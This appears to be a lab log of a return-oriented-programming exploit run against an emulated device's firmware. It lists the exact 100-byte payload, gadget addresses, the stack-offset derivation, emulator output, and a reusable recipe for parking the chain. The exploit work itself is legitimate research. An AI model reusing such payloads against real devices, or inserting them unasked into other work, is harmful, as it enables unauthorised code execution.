# Typed-ROP clean park (rop_park1.lua) — RESULT: PARKED

Date: 2026-11-21. Binary: pristine `./emulator/emulator` (unmodified). One run (`rop_park1.lua`,
1 variant, no retries). Full stdout: `/tmp/rop_park1.out`. Baseline run: `/tmp/rop_e2e.now`.

## Change vs rop_e2e.lua

`rop_e2e.lua` copied to `rop_park1.lua` (byte-identical otherwise; `rop_e2e.lua` MD5 bc443730fdbc441f13a7fcd493ea000a
unchanged, as are `rop_green2.lua` / `rop_proto2.lua`). Typed head, all key timing and the
final-tick injection untouched. The ONLY difference is one extra payload line at
`final_t == 36001` (after the `0E 4D` flood and before the gadget head):

    W(36, 0x4EF2) W(38, 0x4EF2)

## Payload (100 bytes at 0x8154), verbatim hex offsets

- 0x00–0x23 (0–35): flood `0E 4D` pairs (0x4D0E = KEYSCAN entry) — 36 bytes
- 0x24–0x27 (36–39): `F2 4E F2 4E` — **park word 0x4EF2 doubled** (the 4-byte POP-PC here consumes both)
- 0x28–0x2F (40–47): flood `0E 4D` pairs
- 0x30–0x39 (48–57): gadget head `38 35 38 35 01 F8 BE 35 54 81` (unchanged from e2e: 0x3538×2, 0xF801, 0x35BE, 0x8154)
- 0x3A–0x63 (58–99): flood `0E 4D` pairs
- final buffer (verbatim): `0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4DF24EF24E0E4D0E4D0E4D0E4D len=100`

## Offset mapping (how 36/38 was derived)

Tile base 0x8D70 = (0x8DA0 head word) − 48, i.e. `offset = (sp − 0x8D70) mod 100`.
Baseline walk: hops at sp = 0x8DB0, 0x8DB4, … 0x8DFC, 0x8E00 (+4 per hop, 4-byte POP-PC).
Hop after CHAIN entry #20 (sp=0x8DF8) consumes payload offsets 36 and 38
(0x8DF8 − 0x8D70 = 0x8C = 136; 136 mod 100 = 36). Setting both halves to 0x4EF2 makes
that hop's PC = 0x4EF2 (wait-key park) and landed sp = 0x8DFC — inside RAM, before the
0x8E00 boundary; entries #21/#22 (which run off RAM end) never execute.

## Evidence (verbatim stdout, /tmp/rop_park1.out)

The typed pipeline reproduced exactly (same run-variable acceptance as baseline):

    PROBE1: before=2 after=2 NOT-INSERTED(good)
    INPUT: payload 0E4D-flood in, len=100
    WATCH: 16x

Chain head + walk — first 19 entries are byte-identical to the baseline; #20 consumes the park word:

    CHAIN: KEYSCAN #1 ER0=0000 pc=4D20 sp=8DA0 lr=2B1E words[sp-8..sp+7]=4D0E 4D0E 4D0E 4D0E 3538 3538 F801 35BE
    CHAIN: KEYSCAN #19 ER0=0000 pc=4D20 sp=8DF4 lr=2B1E words[sp-8..sp+7]=4D0E 4D0E 4D0E 4D0E 4D0E 4D0E 4EF2 4EF2
    CHAIN: KEYSCAN #20 ER0=0000 pc=4D20 sp=8DF8 lr=2B1E words[sp-8..sp+7]=4D0E 4D0E 4D0E 4D0E 4EF2 4EF2 4D0E 4D0E

(Entry #20's keyscan return pops offsets 36/38 → PC = 0x4EF2, sp ends at 0x8DFC; no #21/#22 — 20 CHAIN lines total, baseline had 22.)

Every WATCH sample (59 samples, t = 160001 → 5960001, ~5.8M ticks ≫ 100k requirement) shows
the same frozen pc/sp (all 59 lines identical apart from t). First sample verbatim,
later samples abbreviated after `hits=20` only:

    WATCH: t=160001 pc=4B96 sp=8D7A tiles=1207 hits=20 rows=001000000000002000004000|000000000000000000000000|3B0000000000000000000000|470000000000000000000000|470000000000000000000000|070000000000000000000000
    WATCH: t=260001 pc=4B96 sp=8D7A tiles=1207 hits=20 …
    WATCH: t=360001 pc=4B96 sp=8D7A tiles=1207 hits=20 …
    WATCH: t=5960001 pc=4B96 sp=8D7A tiles=1207 hits=20 …

(all 59 rows identical: rows 0/2/3/4/5 carry `10`, `3B`, `47`, `47`, `07` near their start —
the park dispatcher's framebuffer state, again frozen.)

Footer (label `NO-TRIGGER` is purely the hits<50 timeout tag from the script; hits=20 IS the
chain having parked):

    PROTO: NO-TRIGGER hits=20 pc=4B96 sp=8D7A
    PROTO: final-buf 0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4D0E4DF24EF24E0E4D0E4D0E4D0E4D len=100

## Verdict: PARKED

- After the last executable hop (CHAIN #20's return, pop at sp=0x8DF8) PC = 0x4EF2; the
  park routine internally reaches the wait-key tree at **0x4B96** (accepted park tree:
  0x4EF2/0x4B96/0x75xx) with **sp = 0x8D7A** — the 0x4EF2 dispatcher settles its own
  stack pointer (it moves sp 0x8DFC → 0x8D7A on entry); this is the park's own stable
  frame, not a crash artifact.
- pc AND sp bit-stable for the full observed window (5.8M ticks, all 59 samples identical);
  zero 0x31xx–0x33xx wandering rows (baseline post-chain chaos completely gone).
- Payload integrity: len=100, zero-free, park bytes `F2 4E F2 4E` verifiable at offset 36–39
  in the final-buf dump.
- Note: `1-3` run cap; variant 1 succeeded on the first run, so rop_park2/3 were not needed.

## Reusable recipe (for the next milestone)

1. Flood the 100-byte typed buffer at 0x8154 with `0E 4D` pairs.
2. Gadget head at offsets 48–57: `W(48,0x3538) W(50,0x3538) W(52,0xF801) W(54,0x35BE) W(56,0x8154)`.
3. Park: place `W(off, 0x4EF2) W(off+2, 0x4EF2)` where `off ≡ (final-churn sp − 0x8D70) mod 100`
   for the hop you want to terminate; off = 36 terminates hop #20 and leaves sp = 0x8DFC in RAM.
